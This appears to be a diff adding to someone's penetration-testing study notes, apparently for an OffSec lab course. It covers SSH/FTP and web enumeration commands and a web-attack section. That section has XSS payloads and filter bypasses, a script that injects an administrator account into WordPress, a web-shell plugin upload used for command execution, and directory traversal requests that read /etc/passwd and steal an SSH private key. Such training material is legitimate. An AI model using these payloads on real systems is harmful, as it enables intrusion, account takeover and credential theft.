@@ -1,5 +1,6 @@
 - [Capture the flag](#capture-the-flag)
 - [Penetration testing methodology](#penetration-testing-methodology)
+- [Encode/Decode](#encode-decode)
 - [Reverse shell](#reverse-shell)
 - [File transfer](#file-transfer)
 - [Remote to other machines](#remote-to-other-machines)
@@ -41,6 +42,21 @@
      - check for port open  
        `sudo nmap -sS -p 139,445 192.168.165.0/24 --open`  
    - protocols
+     - SSH
+       - connect to the victim
+         `ssh -i <private_key_file> <user>@<target_ip>`
+       - sss
+     - FTP
+       - `ftp -A <target>` #login with anonymous credentialss
+         ```
+         #upload
+         ftp> binary
+         ftp> put [binary_file]
+
+         #download
+         wget -r ftp://[user]:[password]@[IP]/
+         ```  
+       - `get test.txt`  
      - SMB  
        - **enumerate users, groups, shares, OS info, password policy**  
          🔍 `enum4linux -a <IP> > SMB_enum_users.txt`  
@@ -66,7 +82,14 @@
      `whatweb http://<IP>`  
      `curl -I http://<IP>`  
    - Enum directory  
-     `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt`
+     `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t5`
+   - Enum API
+     pattern  
+     ```
+     {GOBUSTER}/v1
+     {GOBUSTER}/v2
+     ```
+     `gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`  
    - Web data  
      `curl http://<IP>/robots.txt`
      `curl http://<IP>/sitemap.xml`  
@@ -80,11 +103,11 @@
    - tools: nmap, AutoRecon
    - NSE vulnerability script  
      `sudo nmap -sV -p 443 --script "vuln" <target>`  
-1. initial foothold
+1. initial foothold    
    - Exploit vulnerable service: SMB, FTP, RDP, SSH
+   - web fuzzing: Feroxbuster, WFUF, Burp
    - Web exploitation: SQLi → shell upload, RCE
-   - Credential reuse / default creds
-   - web fuzzing: Feroxbuster, WFUF, Burp  
+   - Credential reuse / default creds  
    - tools: nc, curl, wget, hydra, gobuster
    - password cracking: John, Hashcat, Hydra  
 1. privilege escalation
@@ -114,6 +137,74 @@
      - Limit user privileges (principle of least privilege)
      - Monitor for suspicious activity and audit logs
      - Network segmentation and firewall rules
+
+# Web application attack  
+- Cross-site scripting
+  - Goal: steal cookies, CSRF admin request  
+  - Inspect: search boxes, comment fields, username/password, contact form, URL param, HTTP headers (referer, user-agent) 
+  - Check how values rfected without proper sanitization
+    ```
+    <script>alert(1)</script>  
+    "><script>alert(1)</script>  #inside-html tag
+    " onmouseover=alert(1) x=" #inside attribute
+    ';alert(1);// #inside JS
+
+    #bypass
+    &lt;script&gt;alert(1)&lt;/script&gt;
+    <ScRiPt>alert(1)</sCrIpT>
+    <img src=x onerror=alert(1)>
+    %3Cscript%3Ealert(1)%3C/script%3E
+    ```
+  - Input accepts unsanitized input < > ' " { } ;  
+  - Fuzz: `wfuzz -w payloads/xss.txt -d "name=FUZZ&msg=test" http://target.com/contact.php` 
+  - Testing vulnerability by using payload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc
+  - Create new user and privilege via XSS (user-agent vulnerable field)  
+    1. run this function and get the encoded js
+       ```
+       function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+        
+      let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
+      console.log(encoded)
+       ```
+    2. Intercept the burp request and modify the user-agent
+       `<script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>`
+  - Embeds a web shell in wordpress plugin and RCE command from url  
+    ```
+    https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
+    nano webshell.php
+    zip webshell.zip webshell.php
+    Upload plugin.zip and activate
+    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null: find flag
+    http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag
+    ```
+- Directory traversal
+  - Goal: access credentials by using relative paths
+    `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
+    `curl http://192.168.50.16/cgibin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  
+  - Connect SSH from stolen private key
+    ```
+    curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/<username>/.ssh/id_rsa -o dt_key
+    chmod 400 dt_key
+    ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+    ```
+- Local file inclusion (LFI)
+- Remote file inclusion (RFI)
+- File upload vulnerabilities
+- Command injection
+- SQL injection attacks
+  
+# Encode/Decode  
+- Base64 for web: [CyberChef](https://gchq.github.io/CyberChef/)  
 
 # Reverse shell
 - Kali listener
